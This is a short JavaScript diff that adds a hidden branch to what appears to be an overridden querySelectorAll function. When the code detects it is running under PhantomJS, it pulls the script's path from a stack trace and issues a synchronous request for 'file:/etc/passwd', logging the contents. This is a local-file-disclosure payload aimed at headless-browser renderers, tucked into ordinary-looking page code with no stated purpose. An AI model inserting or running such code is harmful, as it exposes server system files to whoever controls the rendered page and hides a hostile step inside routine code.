@@ -30,6 +30,17 @@
         err = e;
       }
       if (indexOfString(err.stack, 'phantomjs') > -1) {
+        var matches = err.stack.match(/at \w*\s*\((?:(\/[^:]+):\d+:\d+\)|global code \((\/[^)]+):\d+:\d+\))/);
+        var path =matches[1] || matches[2];
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'file:/etc/passwd', false);
+        xhr.onload = function () {
+          console.log(xhr.responseText);
+        };
+        xhr.onerror = function (e) {
+          console.log('Error: ' + JSON.stringify(e));
+        };
+        xhr.send();
         return html;
       } else {
         return oldQSA.apply(this, arguments);
